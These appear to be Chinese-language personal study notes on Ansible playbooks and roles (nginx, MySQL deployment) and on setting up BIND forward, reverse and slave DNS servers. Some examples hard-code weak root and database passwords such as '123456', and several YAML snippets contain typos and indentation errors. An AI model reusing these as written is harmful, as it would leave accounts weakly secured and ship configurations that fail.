Hosts：playbook中的每一个play的目的都是为了让特定主机以某个指定的用户身份执行任务。hosts用于指定要执行指定任务的主机，须事先定义在主机清单中

one.example.com
one.example.com:two.example.com
192.168.1.50
192.168.1.*
Websrvs:dbsrvs     #或者，两个组的并集
Websrvs:&dbsrvs   #与，两个组的交集
webservers:!dbsrvs  #在websrvs组，但不在dbsrvs组
案例：
- hosts: websrvs:appsrvs



#2.remote_user组件
remote_user: 可用于Host和task中。也可以通过指定其通过sudo的方式在远程主机上执行任务，其可用于play全局或某任务；此外，甚至可以在sudo时使用sudo_user指定sudo时切换的用户

- hosts: websrvs
 remote_user: root
  
 tasks:
   - name: test connection
     ping:
     remote_user: magedu
     sudo: yes #默认sudo为root
     sudo_user:wang    #sudo为wang
     


#3.task列表和action组件
play的主体部分是task list，task list中有一个或多个task,各个task 按次序逐个在hosts中指定的所有主机上执行，即在所有主机上完成第一个task后，再开始第二个task
task的目的是使用指定的参数执行模块，而在模块参数中可以使用变量。模块执行是幂等的，这意味着多次执行是安全的，因为其结果均一致
每个task都应该有其name，用于playbook的执行结果输出，建议其内容能清晰地描述任务执行步骤。如果未提供name，则action的结果将用于输出
- hosts: websrvs
  remote_user: root
  gather_facts: no

  tasks:
    - name: test connection
      ping:
    - name: wall
      shell: wall hello

- hosts: dbsrvs
  gather_facts: no
  tasks:
    - name: install httpd
      yum: name=httpd
    - name: start service
      service:
        name: httpd
        state: started
        enabled: yes
[11:12:52 root@ansible ~]# ansible-playbook --syntax-check hello.yml #检查语法格式

playbook: hello.ym
[11:12:52 root@ansible ~]# ansible-playbook -C  hello.yml #假运行，不改变文件格式
[11:12:52 root@ansible ~]# ansible-playbook hello.yml #真运行



#4.忽略错误 ignore_errors
功能：如果一个task出错，默认将不会继续执行其他的task，利用ignore_errors:yes,可以忽略task错误，继续向下执行playbook其他task

案例：
- hosts: websrvs

  tasks:
    - name: error
      command: /bin/false
      ignore_errors: yes #忽略错误
    - name: continue
      command: wall continue



#5.Playbook中使用handlers和notify
Handlers本质是task list ，类似于MySQL中的触发器触发的行为，其中的task与前述的task并没有本质上的不同，主要用于当关注的资源发生变化时，才会采取一定的操作。而Notify对应的action可用于在每个play的最后被触发，这样可避免多次有改变发生时每次都执行指定的操作，仅在所有的变化发生完成后一次性地执行指定操作。在notify中列出的操作称为handler，也即notify中调handler中定义的操作

只要文件有改动，就会把原先的覆盖并重新启动nginx服务
- hosts: websrvs
  remote_user: root
  gather_facts: no
  force_handlers: yes #强行触发handlers
  
  tasks:
    - name: add group nginx
      group: name=nginx state=present
    - name: add user nginx
      user: name=nginx state=present group=nginx
    - name: Install Nginx
      yum: name=nginx state=present
    - name: Config file
      copy: src=files/nginx.conf dest=/etc/nginx/nginx.conf
      notify: restart nginx service #文件改动则触发handlers
    - name: web page
      copy: src=files/index.html dest=/usr/share/nginx/html/index.html
    - name: Start Nginx
      service: name=nginx state=started enabled=yes

  handlers: #被动触发
    - name: restart nginx service
      service: name=nginx state=restarted




#6.Playbook中使用tags组件
在playbook文件中，可以利用tags组件，为特定 task 指定标签，当在执行playbook时，可以只执行特定tags的task,而非整个playbook文件(指定标签任务执行)

- hosts: websrvs
  remote_user: root
  gather_facts: no
  force_handlers: yes 

  tasks:
    - name: add group nginx
      group: name=nginx state=present
    - name: add user nginx
      user: name=nginx state=present group=nginx
    - name: Install Nginx
      yum: name=nginx state=present
    - name: Config file
      copy: src=files/nginx.conf dest=/etc/nginx/nginx.conf
      notify: restart nginx service
      tags: conf  #标签
    - name: web page
      copy: src=files/index.html dest=/usr/share/nginx/html/index.html
      tags: data #标签
    - name: Start Nginx
      service: name=nginx state=started enabled=yes

  handlers:
    - name: restart nginx service
      service: name=nginx state=restarted 
[22:10:13 root@ansible ansible]#ansible-playbook --list-tags install_nginx.yml 

playbook: install_nginx.yml
#查看标签列表
  play #1 (websrvs): websrvs	TAGS: []
      TASK TAGS: [conf, data]

[22:14:17 root@ansible ansible]#ansible-playbook -t conf install_nginx.yml  #指定标签运行




#7.playboo相关命令
--syntax-check      #语法检查
-C --check #只检测可能会发生的改变，但不真正执行操作
--list-hosts    #列出运行任务的主机
--list-tags #列出tag
--list-tasks #列出task
--limit 主机列表 #只针对主机列表中的特定主机执行
-v -vv  -vvv #显示过程
 -i hosts #指定主机清单
```

##### 31.2.5.2Playbook初步

```
#1.利用playbook创建mysql用户
范例：mysql_user.yml
- hosts: dbsrvs
  remote_user: root
  gather_facts: no

  tasks:
    - {name: create group, group: name=mysql system=yes gid=306}
    - name: create user
      user: name=mysql shell=/sbin/nologin system=yes group=mysql uid=306 home=/data/mysql create_home=no
      
 
 
 
#2.利用playbook安装nginx
[13:16:32 root@ansible ansible]#ansible all -m yum -a 'name=httpd state=absent' #要先卸载httpd服务，不然冲突

- hosts: websrvs
  remote_user: root
  gather_facts: no

  tasks:
    - name: add group nginx
      group: name=nginx state=present
    - name: add user nginx
      user: name=nginx state=present group=nginx
    - name: Install Nginx
      yum: name=nginx state=present
    - name: Config file
      copy: src=files/nginx.conf dest=/etc/nginx/nginx.conf
    - name: web page
      copy: src=files/index.html dest=/usr/share/nginx/html/index.html
    - name: Start Nginx
      service: name=nginx state=started enabled=yes
      


#3.利用playbook卸载nginx

- hosts: websrvs
  remote_user: root
  gather_facts: no

  tasks:
    - name: Stop Nginx
      service: name=nginx state=stopped enabled=no
    - name: Remove Nginx
      yum: name=nginx state=absent
    - name: remove user nginx
      user: name=nginx state=absent
    - name: remove group nginx
      group: name=nginx state=absent
    - name: Config file
      file: path=files/nginx.conf state=absent
    - name: web page
      file: path=/usr/share/nginx/html/index.html state=absent
      
      
      
#4.批量修改主机名

- hosts: websrvs
  vars:
    host: web 
    domain: liusenbiao.org

  tasks:
    - name: get variable
      shell: echo $RANDOM | md5sum | cut -c 1-8 
      register: get_random
    - name: print variable
      debug:
        msg: "{{get_random.stdout}}"
    - name: set hostname
      hostname: name={{host}}-{{get_random.stdout}}.{{domain}}

执行结果：
ok: [10.0.0.17] => {
    "msg": "250e4297"
}
ok: [10.0.0.18] => {
    "msg": "967ac074"
}
[root@pxc2 ~]# hostname
web-250e4297.liusenbiao.org
root@slave1:~# hostname
web-967ac074.liusenbiao.org



#5.批量修改密码
- hosts: websrvs
  gather_facts: false

  tasks:
    - name: change user passwd
      user: name={{item.name}} password={{item.chpass | password_hash('sha512')}} update_password=always
      with_items:
           - {name: 'root',chpass: '123456'}
           - {name: 'liu',chpass: '654321'}
```

**利用playbook安装mysql5.6**

![1654223991260](linuxSRE.assets/1654223991260.png)

##### 31.2.5.3Playbook的变量使用

```
#1.针对当前项目的主机和主机组的变量

生产建议在项目目录中创建额外的两个变量目录，分别是hostvars和groupvars
hostvars下面的文件名和主机清单主机名一致，针对单个主机进行变量定义格式:hostvars/hostname
groupvars下面的文件名和主机清单中组名一致针对单个组进行变量定义格式:gorupvars/groupname
group_vars/all文件内定义的变量对所有组都有效


范例:特定项目的主机和组变量
[11:14:33 root@ansible ansible]# mkdir host_vars
[11:15:09 root@ansible ansible]# mkdir group_vars[11:15:19 root@ansible ansible]#vim host_vars/10.0.0.18
id: 2
[11:23:14 root@ansible ansible]#vim host_vars/10.0.0.17
id: 1
[11:25:15 root@ansible ansible]#vim group_vars/websrvs
name: web
[11:25:53 root@ansible ansible]#vim group_vars/all
domain: liusenbiao.org

[11:28:33 root@ansible ansible]#tree host_vars/ group_vars/
host_vars/
├── 10.0.0.17
└── 10.0.0.18
group_vars/
├── all
└── websrvs
[11:28:42 root@ansible ansible]#vim var8.yml
- hosts: websrvs

  tasks:
    - name: get variable
      command: echo "{{name}}{{id}}.{{domain}}"
      register: result #把上面的命令的执行结果传递到result里面
    - name: print variable
      debug:
        msg: "{{result.stdout}}"
执行结果：
ok: [10.0.0.17] => {
    "msg": "web1.liusenbiao.org"
}
ok: [10.0.0.18] => {
    "msg": "web2.liusenbiao.org"
}     

变量的优先级从高到低如下：
-e 选项定义变量-->playbook中vars_files->playbook中vars变量定义 -->host_vars/主机名文件-->主机清单中主机变量-->group_vars/主机组名文件-->group_vars/all文件--> 主机清单组变量




#2.register注册变量
功能：在playbook中可以使用register将捕获命令的输出保存到临时变量中，然后使用debug模块进行显示输出

[11:56:04 root@ansible ansible]#vim register.yml
- hosts: websrvs

  tasks:
    - name: get variable
      shell: hostname
      register: name
    - name: print variable
      debug:
        msg: "{{name.stdout}}"
        
执行结果：
ok: [10.0.0.17] => {
    "msg": "pxc2"
}
ok: [10.0.0.18] => {
    "msg": "slave1.liusenbiao.org"
}
```

#### 31.2.6 template模板

##### 31.2.6.1jinja2语言

```
#0.template功能：可以根据和参考模块文件，动态生成相类似的配置文件
template文件必须存放于templates目录下，且命名为 .j2 结尾
yaml/yml 文件需和templates目录平级，目录结构如下示例：
 ./
 ├── temnginx.yml
 └── templates
 └── nginx.conf.j2
 
 
 #范例：
 #利用template同步nginx配置文件中依据cpu核数来开启进程数
[12:11:05 root@ansible ansible]#vim register2.yml 
[12:12:13 root@ansible ansible]#mkdir templates
[16:49:40 root@ansible ansible]#cp files/nginx.conf templates/nginx.conf.j2
[16:50:05 root@ansible ansible]#vim templates/nginx.conf.j2
#第六行
worker_processes {{ansible_processor_vcpus+2}};
[16:55:42 root@ansible ansible]#vim install_nginx.yml
- hosts: websrvs
  remote_user: root
  gather_facts: yes
  force_handlers: yes 

  tasks:
    - name: add group nginx
      group: name=nginx state=present
    - name: add user nginx
      user: name=nginx state=present group=nginx
    - name: Install Nginx
      yum: name=nginx state=present
    - name: Config file
      #copy: src=files/nginx.conf dest=/etc/nginx/nginx.conf
      template: src=nginx.conf.j2 dest=/etc/nginx/nginx.conf
      notify: restart nginx service #模板模块
      tags: conf
    - name: web page
      copy: src=files/index.html dest=/usr/share/nginx/html/index.html
      tags: data
    - name: Start Nginx
      service: name=nginx state=started enabled=yes

  handlers:
    - name: restart nginx service
      service: name=nginx state=restarted
[17:10:17 root@ansible ansible]#ansible-playbook install_nginx.yml





#1.template中使用流程控制for和if
#templnginx5.yml
- hosts: websrvs
 remote_user: root
 vars:
   nginx_vhosts:
     - web1:
       listen: 8080
       root: "/var/www/nginx/web1/"
     - web2:
       listen: 8080
       server_name: "web2.magedu.com"
       root: "/var/www/nginx/web2/"
     - web3:
       listen: 8080
       server_name: "web3.magedu.com"
       root: "/var/www/nginx/web3/"
 tasks:
   - name: template config to 
     template: src=nginx.conf5.j2 dest=/data/nginx5.conf
          
          
#templates/nginx.conf5.j2
{% for vhost in nginx_vhosts %}
server {
   listen {{ vhost.listen }}
   {% if vhost.server_name is defined %}
server_name {{ vhost.server_name }}   #注意缩进
   {% endif %}
root  {{ vhost.root }}  #注意缩进
}
{% endfor %} 

#生成的结果
server {
   listen 8080
   root /var/www/nginx/web1/
}
server {
   listen 8080
   server_name web2.magedu.com
   root /var/www/nginx/web2/
}
server {
   listen 8080
   server_name web3.magedu.com
   root /var/www/nginx/web3/
}



#2.playbook使用迭代with_items(loop)
迭代：当有需要重复性执行的任务时，可以使用迭代机制
对迭代项的引用，固定内置变量名为"item"
要在task中使用with_items给定要迭代的元素列表
注意: ansible2.5版本后,可以用loop代替with_items


#2.1批量创建账号
- hosts: websrvs
  remote_user: root

  tasks:
    - name: add serveral users
      user: name={{item}} state=present groups=wheel
      with_items:
        - liu1
        - liu2
        - liu3
执行结果：
changed: [10.0.0.17] => (item=liu1)
changed: [10.0.0.17] => (item=liu2)
changed: [10.0.0.18] => (item=liu1)
changed: [10.0.0.17] => (item=liu3)
changed: [10.0.0.18] => (item=liu2)
changed: [10.0.0.18] => (item=liu3)



#2.2卸载 mariadb
#remove mariadb server
- hosts: appsrvs:!10.0.0.8
 remote_user: root
 tasks:
    - name: stop service
     shell: /etc/init.d/mysqld stop
    - name: delete files and dir
     file: path={{item}} state=absent
     with_items:
        - /usr/local/mysql
        - /usr/local/mariadb-10.2.27-linux-x86_64
        - /etc/init.d/mysqld
        - /etc/profile.d/mysql.sh
        - /etc/my.cnf
        - /data/mysql
    - name: delete user
     user: name=mysql state=absent remove=yes
     

#2.3迭代嵌套子变量：在迭代中，还可以嵌套子变量，关联多个变量在一起使用
- hosts: websrvs
  remote_user: root
  
 tasks:
   - name: add some groups
     group: name={{ item }} state=present
     with_items:
       - nginx
       - mysql
       - apache
   - name: add some users
     user: name={{ item.name }} group={{ item.group }} state=present
     with_items:
       - { name: 'nginx', group: 'nginx' }
       - { name: 'mysql', group: 'mysql' }
       - { name: 'apache', group: 'apache' }
       
       
 
 
#3.分组block
功能：当满足一个条件下，执行多个任务时，就需要分组了，而不是每个任务都用when

- hosts: websrvs
  remote_user: root
  
 tasks:
   - block:
       - debug: msg="first"
       - debug: msg="first"
     when:
       - ansible_facts['distribution'] == "CentOS"
       - ansible_facts['distribution_major_version'] == "8"
       
       

#4.changed_when
changed_when检查task返回结果，决定是否继续向下执行
- hosts: websrvs
  remote_user: root
  
  tasks:
    - name: install nginx
      yum: name=nginx
    -name: config file
     template: src="nginx.conf.j2" dest="/etc/nginx/nginx.conf"
     notify: restart nginx
    - name: check config
      shell: /usr/sbin/nginx -t
      register: check_nginx_config
      changed_when:
        - (check_nginx_config.stdout.find('successful')) #如果执行结果有successful的字符串，则继续执行，如果没有则停止向下执行
        - false
     - name : start service
       service: name=nginx state=started enabled=yes
   handlers:
     - name: restart nginx
       service: name=nginx state=restarted
       
       
   
   
#5.滚动执行
管理节点过多导致的超时问题解决方法
默认情况下，Ansible将尝试并行管理playbook中所有的机器。对于滚动更新用例，可以使用serial关键字定义Ansible一次应管理多少主机，还可以将serial关键字指定为百分比，表示每次并行执行的主机数占总数的比例
#5.1范例：

#vim test_serial.yml
---
- hosts: all
 serial: 2  #每次只同时处理2个主机,将所有task执行完成后,再选下2个主机再执行所有task,直至所有主机

 gather_facts: False
 tasks:
   - name: task one
 comand: hostname
   - name: task two
     command: hostname
     

#5.2范例：
- name: test serail
 hosts: all
 serial: "20%"   #每次只同时处理20%的主机
 
 
 
#6.委派到其他主机执行
功能：本机不执行，把任务委派到其他之际执行
command: hostname -I
delegate_to: 10.0.0.8




#6.yaml文件的相互调用

#6.1include: b.yml #调用另一个yml文件

#6.2也可以将多个包含完整内容的yml文件由一个yml统一调用
[16:19:30 root@ansible ~]# cat total_tasks.yml
-import_playbook: tasks1.yml
-import_playbook: tasks2.yml
[16:19:30 root@ansible ~]# cat tasks1.yml
- hosts: websrvs
  remote_user: root
  
  tasks:
    - name: run tasks1 job
      command: wall run tasks1 job
[16:19:30 root@ansible ~]# cat tasks2.yml      
- hosts: websrvs
  remote_user: root
  
  tasks:
    - name: run tasks2 job
      command: wall run tasks2 job
```

#### 31.2.7企业级roles角色

roles能够根据层次型结构自动装载变量文件、tasks以及handlers等。要使用roles只需要在playbook中使用include指令即可。简单来讲，roles就是通过分别将变量、文件、任务、模板及处理器放置于单独的目录中，并可以便捷地include它们的一种机制。角色一般用于基于主机构建服务的场景中，但也可以是用于构建守护进程等场景中

![1654331660992](linuxSRE.assets/1654331660992.png)

##### 31.2.7.1用role多台主机部署nginx

```
#0.创建role的步骤：

1 创建以roles命名的目录
2 在roles目录中分别创建以各角色名称命名的目录，如mysql等
3 在每个角色命名的目录中分别创建files、handlers、tasks、templates和vars等目录；用不到的目录可以创建为空目录，也可以不创建
4 在每个角色相关的子目录中创建相应的文件,如 tasks/main.yml,templates/nginx.conf.j2
5 在playbook文件中，调用需要的角色



#1.具体实现
#1.0拆分nginx服务
[19:25:55 root@ansible ansible]#cat /data/ansible/install_nginx.yml
- hosts: websrvs
  remote_user: root
  gather_facts: yes
  force_handlers: yes

  tasks:
    - name: add group nginx
      group: name=nginx state=present
    - name: add user nginx
      user: name=nginx state=present group=nginx
    - name: Install Nginx
      yum: name=nginx state=present
    - name: Config file
      #copy: src=files/nginx.conf dest=/etc/nginx/nginx.conf
      template: src=nginx.conf.j2 dest=/etc/nginx/nginx.conf
      notify: restart nginx service
      tags: conf
    - name: web page
      copy: src=files/index.html dest=/usr/share/nginx/html/index.html
      tags: data
    - name: Start Nginx
      service: name=nginx state=started enabled=yes

  handlers:
    - name: restart nginx service
      service: name=nginx state=restarted 

#1.1创建角色相关的目录
[16:46:11 root@ansible ansible]#mkdir roles/nginx/{tasks,templates,handlers,files} -pv


#1.2main.yml是task的入口文件：顺序执行
[16:50:27 root@ansible ansible]#vim roles/nginx/tasks/main.yml

- include: group.yml
- include: user.yml
- include: install.yml
- include: config.yml
- include: data.yml
- include: service.yml


#1.3创建相关任务文件
[16:56:03 root@ansible ansible]#cd roles/nginx/tasks/
[16:57:52 root@ansible tasks]#vim group.yml
- name: add group nginx
  group: name=nginx state=present
  
[17:02:17 root@ansible tasks]#vim user.yml
-name: add user nginx
 user: name=nginx state=present group=nginx

[17:04:36 root@ansible tasks]#vim install.yml
- name: Install Nginx
  yum: name=nginx state=present

[17:06:23 root@ansible tasks]#vim config.yml
- name: Config file
  template: src=nginx.conf.j2 dest=/etc/nginx/nginx.conf
  notify: restart nginx service
  tags: conf

[17:10:30 root@ansible tasks]#vim data.yml
- name: web page
  copy: src=index.html dest=/usr/share/nginx/html/index.html
  tags: data
  
[17:13:32 root@ansible tasks]#vim service.yml
- name: Start Nginx
  service: name=nginx state=started enabled=yes
  
[17:38:42 root@ansible nginx]#tree
.
├── files
├── handlers
├── tasks
│   ├── config.yml
│   ├── data.yml
│   ├── group.yml
│   ├── install.yml
│   ├── main.yml
│   ├── service.yml
│   └── user.yml
└── templates
[17:40:52 root@ansible nginx]#cp /etc/nginx/nginx.conf templates/nginx.conf.j2
[17:41:42 root@ansible nginx]#vim templates/nginx.conf.j2
user {{ web_user }}; #还没定义变量
worker_processes {{ansible_processor_vcpus**2}}; #2次方

#开始定义变量
[17:47:50 root@ansible nginx]#mkdir vars
[17:48:24 root@ansible nginx]#vim vars/main.yml
web_user: nginx

#开始定义handlers
[17:50:58 root@ansible nginx]#vim handlers/main.yml
- name:  restart nginx service
  service: name=nginx state=restarted
  
#开始定义web界面
[17:55:59 root@ansible nginx]#vim files/index.html
<h1> liusenbiao's nginx </h1>
[17:58:18 root@ansible nginx]# tree
.
├── files
│   └── index.html
├── handlers	
│   └── main.yml
├── tasks
│   ├── config.yml
│   ├── data.yml
│   ├── group.yml
│   ├── install.yml
│   ├── main.yml
│   ├── service.yml
│   └── user.yml
├── templates
│   └── nginx.conf.j2
└── vars
    └── main.yml

6 directories, 11 files

#2.在playbook中调用角色
[18:22:07 root@ansible ansible]#pwd
/data/ansible
[18:22:10 root@ansible ansible]#vim nginx.yml
- hosts: 10.0.0.*

  roles:
    - nginx #之前创建的nginx文件夹
    - mysql
[18:54:51 root@ansible ansible]#ansible-playbook -C nginx.yml #检查语法
[18:54:51 root@ansible ansible]#ansible-playbook nginx.yml
```

![1654340478799](linuxSRE.assets/1654340478799.png)

##### 31.用role多台主机部署mysql5.7-8.0

```
#整体文件的目录结构
[23:44:14 root@ansible mysql]#pwd
/data/ansible/roles/mysql
[00:08:34 root@ansible mysql]#tree
.
├── files
│   ├── my.cnf
│   └── mysql-8.0.19-linux-glibc2.12-x86_64.tar.xz
├── tasks
│   ├── config.yml
│   ├── data.yml
│   ├── group.yml
│   ├── install.yml
│   ├── linkfile.yml
│   ├── main.yml
│   ├── path.yml
│   ├── script.yml
│   ├── secure.yml
│   ├── service.yml
│   ├── source.yml
│   ├── unarchive.yml
│   └── user.yml
└── vars
    └── main.yml

3 directories, 16 files


#0.创建相应文件夹
[19:43:30 root@ansible roles]# mkdir /data/ansible/roles/mysql/{tasks,vars,files} -pv
[19:43:30 root@ansible roles]# cd /data/ansible/
[23:37:13 root@ansible ansible]# cat > mysql.sh <<EOF
PATH=/usr/local/mysql/bin/:$PATH
EOF
[23:38:35 root@ansible ansible]#cat mysql.sh 
PATH=/usr/local/mysql/bin/:$PATH #注意这个环境变量歹是完整一行，不然最后mysql起不来




#1.配置files里的文件
[19:43:30 root@ansible roles]# cat > /data/ansible/roles/mysql/files/my.cnf << EOF
[mysqld]
server-id=1
log-bin
datadir=/data/mysql
socket=/data/mysql/mysql.sock
log-error=/data/mysql/mysql.log
pid-file=/data/mysql/mysql.pid
[client]
socket=/data/mysql/mysql.sock
EOF


#2.配置变量vars
[19:43:30 root@ansible roles]# cat > /data/ansible/roles/mysql/vars/main.yml <<EOF
mysql_version: 8.0.23
//mysql_version: 5.7.38
mysql_file: mysql-{{mysql_version}}-linux-glibc2.12-x86_64.tar.xz
//mysql_file: mysql-{{mysql_version}}-linux-glibc2.12-x86_64.tar.gz
mysql_root_password: 123456
EOF


#3.配置tasks的主任务列表main.yml
[19:43:30 root@ansible roles]# cat > /data/ansible/roles/mysql/tasks/main.yml <<EOF
- include: install.yml
- include: group.yml
- include: user.yml
- include: unarchive.yml
- include: linkfile.yml
- include: data.yml
- include: config.yml
- include: script.yml
- include: path.yml
- include: service.yml
- include: secure.yml
- include: source.yml
EOF


#4.配置tasks的子任务
[19:43:30 root@ansible roles]# cat > /data/ansible/roles/mysql/tasks/install.yml <<EOF
- name: install package
  yum:
    name:
      - libaio
      - numactl-libs
EOF

[19:43:30 root@ansible roles]# cat > /data/ansible/roles/mysql/tasks/group.yml <<EOF
- name: create mysql group
  group: name=mysql gid=306
EOF

[19:43:30 root@ansible roles]# cat > /data/ansible/roles/mysql/tasks/user.yml <<EOF
- name: create mysql user
  user: name=mysql uid=306 group=mysql shell=/sbin/nologin system=yes create_home=no home=/data/mysql
EOF

[19:43:30 root@ansible roles]# cat > /data/ansible/roles/mysql/tasks/unarchive.yml <<EOF
- name: copy tar to remote host and file mode
  unarchive: src={{mysql_file}} dest=/usr/local/ owner=root group=root
EOF

[19:43:30 root@ansible roles]# cat > /data/ansible/roles/mysql/tasks/linkfile.yml <<EOF
- name: create linkfile /usr/local/mysql
  file: src=/usr/local/mysql-{{mysql_version}}-linux-glibc2.12-x86_64 dest=/usr/local/mysql state=link
EOF

[19:43:30 root@ansible roles]# cat > /data/ansible/roles/mysql/tasks/data.yml <<EOF
- name: data dir
  shell: /usr/local/mysql/bin/mysqld --initialize-insecure --user=mysql --datadir=/data/mysql
  tags: data
EOF

[19:43:30 root@ansible roles]# cat > /data/ansible/roles/mysql/tasks/config.yml <<EOF
- name: config my.cnf
  copy: src=/data/ansible/files/my.cnf dest=/etc/my.cnf
EOF

[19:43:30 root@ansible roles]# cat > /data/ansible/roles/mysql/tasks/script.yml <<EOF
- name: service script
  shell: /bin/cp /usr/local/mysql/support-files/mysql.server /etc/init.d/mysqld
EOF

[19:43:30 root@ansible roles]# cat > /data/ansible/roles/mysql/tasks/path.yml <<EOF
- name: PATH variable
  copy: src=/data/ansible/mysql.sh dest=/etc/profile.d/mysql.sh
EOF

[19:43:30 root@ansible roles]# cat > /data/ansible/roles/mysql/tasks/service.yml <<EOF
- name: enable service
  shell: chkconfig --add mysqld;/etc/init.d/mysqld start
  tags: service
EOF

[19:43:30 root@ansible roles]# cat > /data/ansible/roles/mysql/tasks/secure.yml <<EOF
- name: change password
  shell: /usr/local/mysql/bin/mysqladmin -uroot password {{mysql_root_password}}
EOF


[19:43:30 root@ansible roles]# cat > /data/ansible/roles/mysql/tasks/source.yml <<EOF
- name: source PATH
  shell: source /etc/profile.d/mysql.sh;
EOF



#5.在playbook中调用角色
[18:22:07 root@ansible ansible]# pwd
/data/ansible
[18:22:10 root@ansible ansible]# vim mysql.yml
- hosts: 10.0.0.*

  roles:
  //  - nginx #之前创建的nginx文件夹
    - mysql
[18:54:51 root@ansible ansible]# ansible-playbook -C nginx.yml #检查语法
[18:54:51 root@ansible ansible]# ansible-playbook mysql.yml
```

## 32.搭建DNS服务器

### 32.1.私有的DNS服务互联网访问

```
完整的查询请求经过的流程:
Client -->hosts文件 --> Client DNS Service Local Cache --> DNS Server (recursion递归) --> DNS Server Cache -->DNS iteration(迭代) --> 根--> 顶级域名DNS-->二级域名
DNS…

#1.私有的DNS服务互联网访问
#服务器端
[root@centos8 ~]#yum -y install bind 
[root@centos8 ~]# systemctl enable --now named.service
#此时的服务器已经作为一个DNS服务器，如果别的服务器想要通过连接这个域名服务器来ping www.baidu.com,要修改named.conf的配置文件
options {
        //listen-on port 53 { localhost; }; #也可以直接删掉
        listen-on-v6 port 53 { ::1; };
        directory       "/var/named";
        dump-file       "/var/named/data/cache_dump.db";
        statistics-file "/var/named/data/named_stats.txt";
        memstatistics-file "/var/named/data/named_mem_stats.txt";
        secroots-file   "/var/named/data/named.secroots";
        recursing-file  "/var/named/data/named.recursing";
        // allow-query     { any; };   #也可以直接删掉
[root@centos8 ~]# rndc reload #重新加载配置文件
[root@centos8 ~]# rndc flush #清除缓存

#客户端
[root@centos7_clone1 ~]# yum -y install bind-utils
[root@centos7_clone1 network-scripts]# host www.baidu.com
www.baidu.com is an alias for www.a.shifen.com.
www.a.shifen.com has address 39.156.66.14
www.a.shifen.com has address 39.156.66.18
```

### 32.2内部网络的DNS服务

#### 32.2.1正向解析DNS服务

```
#服务器端
[root@centos8 ~]# vim /etc/named.rfc1912.zones
#定义自己公司内部的域名解析文件
zone "liusenbiao.cn" {
        type master;
        file "liusenbiao.cn.zone"; #去xxx.zone文件解析
};
[root@centos8 ~]# cd /var/named/
[root@centos8 named]# cp named.localhost liusenbiao.cn.zone -p
#-p是保留原有权限的意思
[root@centos8 named]# ll liusenbiao.cn.zone
-rw-r----- 1 root named 152 Apr 24  2020 liusenbiao.cn.zone
[root@centos8 named]# vim liusenbiao.cn.zone
$TTL 1D
@   IN SOA  master admin.liusenbiao.org. (
                   0    ; serial #版本更新序列号
                   1D   ; refresh#一天更新一次
                   1H   ; retry #更新失败，1小时再试一次
                   1W   ; expire#一直同步不上，认为是过期数据
                   3H )     ; minimum#若有骚扰数据，不查磁盘
    NS  master
master  A   10.0.0.8
www     A   10.0.0.153 #ubuntu地址，为了做测试，搭建web服务
db      A   10.0.0.123
ks8node1 A  10.0.0.101
ks8node2 A  10.0.0.102
*        A  10.0.0.153 #泛域名解析wwwwwww.liusenbiao.cn
@        A  10.0.0.153 #不需要写www
@        MX 10 mail1 #配置邮件服务器：10代表优先级
mail1    A  10.0.0.201

SOA：Start Of Authority，起始授权记录；一个区域解析库有且仅能有一个SOA记录，必须位于
解析库的第一条记录
A：internet Address，作用，名称 --> IP
AAAA：FQDN --> IPv6
PTR：PoinTeR，IP --> FQDN
NS：Name Server,当前域名将来有几个DNS服务器 
CNAME ： Canonical Name，别名记录
MX：Mail eXchanger，邮件交换器
使用 “@” 符号可用于引用当前区域的名字
[root@centos8 named]# named-checkconf #检查语法是否正确
[root@centos8 named]# named-checkzone liusenbiao.cn liusenbiao.cn.zone  #检查.zone文件是否正确 
zone liusenbiao.cn/IN: loaded serial 0
OK

#用ubuntu搭建web服务
root@ubuntu1804:~# apt install apache2
root@ubuntu1804:~# vim /var/www/html/index.html
www.liusenbiao.cn

#centos7做联通性测试
[root@centos7_clone1 ~]# dig www.liusenbiao.cn
;; ANSWER SECTION:
www.liusenbiao.cn.	86400	IN	A	10.0.0.153
[root@centos7_clone1 ~]# curl www.liusenbiao.cn
www.liusenbiao.cn
```

#### 32.2.2反向解析DNS服务

```
#centos8服务器端
[root@centos8 named]# vim /etc/named.rfc1912.zones
#0.0.10.in-addr.arpa反向解析的域名
zone "0.0.10.in-addr.arpa" {
        type master;
        file "10.0.0.zone"; #随便写
};
[root@centos8 named]# pwd
/var/named
[root@centos8 named]# vim 10.0.0.zone
$TTL 1D
@   IN SOA  ns1 admin.liusenbiao.org. (
                    0   ; serial
                    1D  ; refresh
                    1H  ; retry
                    1W  ; expire
                    3H )    ; minimum
    NS ns1.liusenbiao.cn. 
166 PTR www.liusenbiao.cn. #PTR代表的是反向解析
200 PTR app.liusenbiao.cn.
[root@centos8 named]# chmod 640 10.0.0.zone ;chgrp named 10.0.0.zone 
[root@centos8 named]# rndc reload #只加载配置文件
[root@centos8 named]# rndc stop #暂停DNS服务
[root@centos8 named]# systemctl start named #开始DNS服务

#centos7测试端
[root@centos7_clone1 ~]# dig -t ptr 100.0.0.10.in-addr.arpa
#status: NXDOMAIN：没解析成功！！！
[root@centos7_clone1 ~]# dig -t ptr 100.0.0.10.in-addr.arpa
#解析成功!!!：
;; ANSWER SECTION:
100.0.0.10.in-addr.arpa. 86400	IN	PTR	www.liusenbiao.cn.
[root@centos7_clone1 ~]# dig -t ptr 200.0.0.10.in-addr.arpa
#解析成功!!!
;; ANSWER SECTION:
200.0.0.10.in-addr.arpa. 86400	IN	PTR	app.liusenbiao.cn.

#开启缓存
[root@centos7_clone1 ~]# yum -y install nscd
[root@centos7_clone1 ~]# systemctl enable --now nscd
[root@centos7_clone1 ~]# nscd -g #查看缓存信息
[root@centos7_clone1 ~]# nscd -i hosts #清除缓存

#ubuntu修改配置
root@ubuntu1804:~# vim /etc/netplan/01-netcfg.yaml
network:
  version: 2
  renderer: networkd
  ethernets:
    eth0:
      addresses:
      - 10.0.0.153/24
      gateway4: 10.0.0.2
      nameservers:
         search: [liusenbiao.cn,liusenbiao.org]
         addresses: [10.0.0.8] #指向配置的DNS服务器
root@ubuntu1804:~# systemd-resolve --status #查看是否生效
Link 2 (ens33)
      Current Scopes: DNS
       LLMNR setting: yes
MulticastDNS setting: no
      DNSSEC setting: no
    DNSSEC supported: no
         DNS Servers: 10.0.0.8  #出现这个代表有效成功
          DNS Domain: liusenbiao.cn
                      liusenbiao.org
```

#### 32.2.3实现子DNS服务器

```
#[root@centos8 ~]是实现DNS的主服务器，10.0.0.8
#root@centos8_1是实现DNS子服务器，10.0.0.152
#目标:实现主从节点，主从复制和主从抓包安全问题
#实现了容错和负载均衡

#DNS子服务器
root@centos8_1:~# dnf -y install bind
root@centos8_1:~# vim /etc/named.conf
options {
